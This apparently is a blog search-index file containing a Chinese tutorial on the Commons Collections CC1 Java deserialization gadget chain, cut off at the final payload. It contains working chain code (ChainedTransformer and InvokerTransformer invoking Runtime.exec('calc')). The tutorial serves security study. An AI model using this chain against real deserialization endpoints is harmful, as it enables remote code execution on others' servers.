<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2025/09/02/Java%E5%AE%89%E5%85%A8-CC1-LazyMap/"/>
      <url>/2025/09/02/Java%E5%AE%89%E5%85%A8-CC1-LazyMap/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections1</title>
      <link href="/2025/09/01/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BE/"/>
      <url>/2025/09/01/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><p>JDK1.7(7u80)、commons-collections(3.x 4.x均可这里使用3.2版本)</p><p>JDK：<a href="https://repo.huaweicloud.com/java/jdk/7u80-b15/jdk-7u80-windows-x64.exe">https://repo.huaweicloud.com/java/jdk/7u80-b15/jdk-7u80-windows-x64.exe</a><br>源码JDK：<a href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/a942e0b52477">https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/a942e0b52477</a><br>cc3.2：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下载源码JDK压缩包，并将\src\share\classes\sun文件放入到安装的jdk1.7.0_80文件中的src文件中，如果不存在src文件，将src.zip解压后放入<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-01%20010456.png"></p><p>并在IDEA中，创建maven项目，将src文件放到SDK jdk1.7的源文件下<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-01%20010729.png"></p><h1 id="CC简介"><a href="#CC简介" class="headerlink" title="CC简介"></a>CC简介</h1><p><strong>Apache Commons Collections</strong>是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发。commons-collections这里简称<strong>CC</strong>。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>CC1链利用了 Apache Commons Collections 中的反序列化漏洞。攻击者通常会构造一个链式对象，其中一个对象会调用另一个对象的方法，最终通过调用一些不安全的方法来执行恶意操作。</p><p>反序列化漏洞需要有重写readObject()方法，且能执行Runtime.getRutime().exec()</p><p>所以需要分析Apache Commons Collections库中有哪些类可以调用exec()并执行的</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p><font color=red>InvokerTransformer</font> 是一个非常重要的实现类，它允许调用某个对象的方法并返回结果。它接受方法名和方法参数类型，并执行该方法。</p><p>在分析中我们找到了InvokerTransformer类中的transform()方法中存在通过反射调用传入的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String methodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] paramTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.methodName = methodName;  <span class="comment">//方法名</span></span><br><span class="line">        <span class="built_in">this</span>.paramTypes = paramTypes;  <span class="comment">//方法的形参类型</span></span><br><span class="line">        <span class="built_in">this</span>.args = args;              <span class="comment">//形参值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个方法中的反射是重点</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试在transform中调用exec<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-01%20191853.png"><br>查找谁又调用了transform<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-01%20192300.png"></p><p>LazyMap和TransformedMap都有调用transform，LazyMap是国外的方法，TransformedMap是国内的，所以我们先分析国内的调用方法</p><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>上面图片中显示了TransformedMap类中的checkSetValue()方法调用了transform</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span> <span class="keyword">extends</span>    <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkSetValue()中的valueTransformer来自构造器中的值，而构造器是私有的，但decorate的调用可以返回new TransformedMap()</p><p>通过decorate中的参数，所以创建一个Map的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; map =<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br></pre></td></tr></table></figure><p>checkSetValue()的transform是由valueTransformer调用的，而valueTransformer是实例化类时传入的，所以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//keyTransformer用不到可以设置为空，所以只需要将能够通过transform()调用Runtime.getRuntimr.exec(&quot;calc&quot;)的实例化InvokerTransformer类传入即可</span></span><br><span class="line">Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure><p>由于checkSetValue()是私有的方法，所以我们需要查找谁调用了它，Ctrl + 左键跟进找到了AbstractInputCheckedMapDecorator抽象类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractInputCheckedMapDecorator</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> &#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Entry代表的是Map中的一个键值对，而对Map中含有setValue方法，我们在对Map进行遍历的时候可以调用setValue这个方法<br>不过上面这个MapEntry类实际上是重写了setValue方法，看他继承的父类AbstractMapEntryDecorator实现了Map.Entry接口，其中也重写了setValue方法<br>当使用增强型 for 循环遍历 EntrySet 时，Java 编译器会在底层调用 iterator() 方法，后续会调用到AbstractInputCheckedMapDecorator类的EntrySet 对象的iterator()，在迭代器里面会new一个MapEntry，entry就是MapEntry的实例，就能执行setValue()方法了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javatest;</span><br><span class="line"><span class="keyword">import</span> com.sun.javafx.collections.MappingChange;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodHandle;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> javax.swing.text.html.ObjectView;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line">        Map&lt;Object,Object&gt; map =<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = (TransformedMap) TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(Runtime.getRuntime());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-02%20005036.png"></p><p>再看谁调用了AbstractInputCheckedMapDecorator类的setValue()方法</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-02%20010003.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且这个类重写了readObject()方法，且方法内的增强for循环跟我们构建的for循环非常相识，但传入的内容会经过两个if判断才能调用setValue()<br>1，第一个if判断<br><strong>memberType !&#x3D; null</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">annotationType = AnnotationType.getInstance(type);</span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure><p>查看type是哪里来的，发现是实例化时传入构造器中的注解<br>拆分出来后的代码，其实是获取传入的注解的成员变量名字，判断是否与传入map中的key的值是否相同<br>在Target注解中存在成员变量名为value<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-02%20012931.png"><br>那么就可以把map中key的值改为value,即可通过第一个if<br>2，第二个if<br>判断是否是强转类型，我们传的肯定强转不了，就一定能过。</p><p>成功进入第二个if后，发现AnnotationInvocationHandler类的readObject()方法调用的setValue()方法的参数不可控。</p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer 类实现了 Transformer 接口，其作用是将所有输入的对象转换为一个常量对象。它通常用于在对象链中生成固定的返回值。<br>在反序列化漏洞的利用中，ConstantTransformer 经常被用来将对象转换为某个固定的对象。例如，它可以将任何传入的对象转换为一个 Runtime 类的实例，方便后续链式调用 exec() 方法来执行恶意命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类也是实现了 Transformer 接口的，并且无论传入什么值，都只会返回固定的值 iConstant ，所以创建ConstantTransformer实例，将Runtime.getRuntime()作为参数传入构造器中，那么只要调用了transform 方法就会返回Runtime.getRuntime()</p><p>由于Runtime类没有继承Serializable接口，不可以被序列化，所以需要用反射的方式调用。</p><p>而前面我们用到的InvokerTransformer类中的transform()刚好能解决这一问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(constantTransformer);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">invoke</span> <span class="operator">=</span>(Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(invoke);</span><br></pre></td></tr></table></figure><p>通过transform()循环调用,从后一个去调用前一个</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这个代码也是实现了Transformer的接口，是一个允许将多个 Transformer 链接起来按顺序执行的类。它接收一个 Transformer 数组，并依次将输入对象传递给每个 Transformer，直到返回最终的转换结果。<br>所以改变一下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformerArray=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),        <span class="comment">//解决问题一：AnnotationInvocationHandler类的readObject()方法调用 的setValue()方法的参数不可控</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformerArray);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反序列化后调用了这个方法，object任传一个即可</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">     <span class="comment">// i=0: ConstantTransformer.transform()此时object作为参数值，没有任何用，在transform执行后object对应的值会被覆盖为constant。</span></span><br><span class="line">     <span class="comment">// i=1: InvokerTransformer.transform()接收Runtime.class,传入Runtime.class作为input，得到getRuntime方法的Class反射对象</span></span><br><span class="line">     <span class="comment">// i=2: 传入getRuntime方法的Class反射对象，得到invoke方法实例</span></span><br><span class="line">     <span class="comment">// i=3: 传入invoke的Method方法实例，然后调用exec方法，指定exec方法的参数是cala</span></span><br><span class="line">           object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> object;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最终Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 